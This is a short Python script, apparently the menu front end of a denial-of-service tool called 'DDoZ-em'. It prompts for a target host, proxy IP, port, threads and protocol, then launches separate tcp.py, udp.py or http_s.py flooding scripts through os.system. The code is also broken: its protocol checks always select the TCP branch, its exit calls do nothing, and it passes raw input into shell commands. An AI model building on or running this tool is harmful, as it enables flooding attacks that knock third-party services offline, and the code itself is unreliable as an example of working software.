#Author ApplleePie

#Libs
import os
from sys import exit 

#Host
os.system('cls' if os.name == 'nt' else 'clear')
host = input('\033[92m[x] HOST (required!) [x]\n\033[35mEXAMPLE: www.google.com\nEXAMPLE: 8.8.8.8\n\n\033[94mroot@DDoZ-em:~#\033[0m ')
if host == "":
    print('\033[31mPlease, enter HOST!\n')
    exit() 

#IP
os.system('cls' if os.name == 'nt' else 'clear')
ip = input('\033[92m[x] PROXY IP (required!) [x]\n\033[35mEXAMPLE: 123.213.231.0\n\n\033[94mroot@DDoZ-em:~#\033[0m ')
if ip == "":
    print('\033[31mPlease, enter PROXY IP!\n')
    from sys import exit 

#Port
os.system('cls' if os.name == 'nt' else 'clear')
port = input('\033[92m[x] PROXY PORT (deafult 80) [x]\n\033[35mEXAMPLE: 80\n\n\033[94mroot@DDoZ-em:~#\033[0m ')
if port == "":
    print('\033[31mPlease, enter PROXY PORT!\n')
    from sys import exit 

#Threads
os.system('cls' if os.name == 'nt' else 'clear')
thr = input('\033[92m[x] THREADS (default 5)[x]\n\033[35mEXAMPLE: 200\n\n\033[94mroot@DDoZ-em:~#\033[0m ')
if thr == "":
    thr = 5

#Protocol
os.system('cls' if os.name == 'nt' else 'clear')
prot = input('\033[92m[x] PROTOCOL (HTTP/HTTPS/TCP/UDP) (required!) [x]\n\033[35mEXAMPLE: HTTP\n\n\033[94mroot@DDoZ-em:~#\033[0m ')

#TCP-UDP-HTTP-HTTPS
os.system('cls' if os.name == 'nt' else 'clear')
if prot == 'tcp' or 'Tcp' or 'TCP':
    os.system(f'\npython3 tcp.py -i {ip} -p {port} -w {thr}')
elif prot == 'udp' or 'Udp' or 'UDP':
    os.system(f'\npython3 udp.py -i {ip} -p {port} -w {thr}')
elif prot == 'http' or 'Http' or 'HTTP' or 'https' or 'Https' or 'HTTPS':
    path = input('\033[92m[x] PATH (default random) [x]\n\033[35mEXAMPLE: /general\n\n\033[94mroot@DDoZHem:~#\033[0m ')
    if path == 'random':
        os.system(f'\npython3 http_s.py -t {host} -i {ip} -p {port} -w {thr} ')
    else:
        os.system(f'\npython3 http_s.py -t {host} -i {ip} -p {port} -f {path} -w {thr} ')
else:
    print('\033[31mPlease, enter right PROTOCOL!\n')
    from sys import exit 
